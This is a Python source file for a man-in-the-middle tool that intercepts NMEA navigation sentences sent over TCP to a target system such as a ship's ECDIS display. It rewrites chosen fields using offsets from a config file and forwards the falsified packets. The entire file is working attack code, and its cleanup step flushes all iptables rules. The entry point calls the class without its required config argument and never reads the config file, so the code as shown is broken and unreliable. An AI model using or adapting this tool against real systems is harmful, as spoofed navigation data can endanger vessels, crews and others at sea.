from struct import pack
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import argparse
from pyais import *
from NMEA import NMEA
        
class MITM:
    def __init__(self, target_ip,  src_ip, config_data):
        self.target_ip = target_ip
        self.src_ip = src_ip
        self.src_mac = None
        self.target_mac = None
        self.nfqueue = NetfilterQueue()
        self.pkt = None
        self.config_data = config_data
        self.target_sentences = list(config_data.keys())

    def modify(self, packet):
        
        pkt = packet.get_payload()
        pktIP = IP(pkt)
        
        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
        
        try:
            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                print("-"*20)
                sentence_type = payload.split(",")[0][1:]

                if sentence_type in self.target_sentences:

                    print(f"[*] Packet Intercepted with payload \n{payload}")

                    old_len = len(pktIP[TCP].payload)
                    pktIP[TCP].remove_payload()
                    
                    nmea_obj = NMEA(sentence=payload)
                    nmea_obj.decode()

                    for attribute in list(self.config_data[sentence_type]['attributes']):
                        if attribute['incremental']:
                            nmea_obj.modify_attr(attribute['key'], str(float(nmea_obj.data[attribute['key']]) + attribute['value']))
    
                        else:
                            nmea_obj.modify_attr(attribute['key'], attribute['value'])

                    pktIP[TCP].add_payload(nmea_obj.sentence)
                    print(f"\n[*] Payload modified and sending...\n{nmea_obj.sentence}\n")
                    
                    new_len = len(pktIP[TCP].payload)
                    pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
                    del pktIP[IP].chksum
                    del pktIP[TCP].chksum
                    
                    pkt = pktIP.__class__(bytes(pktIP))
                    packet.set_payload(bytes(pkt))

        except Exception as e:
           print(e)

        packet.accept()
       

    def setup(self):
        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
        os.system(iptable_config)
        self.nfqueue.bind(0, self.modify)

    def clean_up(self):
        print("[*] Flushing iptables")
        os.system('iptables -F')
        os.system('iptables -X')

    def stop_mitm(self):
        self.clean_up()


def get_input():
    parser = argparse.ArgumentParser(description="NEMA MITM Tool")
    parser.add_argument("-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
    parser.add_argument("-s", "--source-ip", help="Source system IP address", required=True)
    parser.add_argument("-c", "--config", help="JSON config file", required=True)

    args = parser.parse_args()
    return args


if __name__ == '__main__':
    args = get_input()

    mitm = MITM(args.target_ip, args.source_ip)
    mitm.setup()
    
    try:
        print("[*] waiting for data")
        mitm.nfqueue.run()
        
    except KeyboardInterrupt:
        mitm.stop_mitm()

    mitm.nfqueue.unbind()
